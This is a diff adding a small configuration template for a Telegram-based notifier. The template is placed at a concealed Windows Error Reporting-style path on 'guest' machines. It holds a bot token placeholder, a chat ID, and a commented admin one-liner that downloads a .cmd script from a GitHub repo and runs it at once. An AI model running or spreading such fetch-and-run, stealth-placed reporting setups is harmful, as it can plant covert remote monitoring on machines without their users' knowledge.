@@ -1,0 +1,11 @@
+# Copy to each guest as:
+#   %ProgramData%\Microsoft\Windows\WER\Temp\.wucache\notify.cfg
+#
+# Format (no quotes):
+BOT_TOKEN=123456789:AA....your_bot_token....
+CHAT_ID=7547462070
+
+# Optional one-liner on a Guest (Admin):
+# curl.exe -L --ssl-no-revoke -o "%TEMP%\seed_notify.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/main/seed_notify.cmd" && "%TEMP%\seed_notify.cmd" "YOUR_BOT_TOKEN" "YOUR_CHAT_ID"
+#
+# Do NOT commit a real notify.cfg to the public github-drop repo.
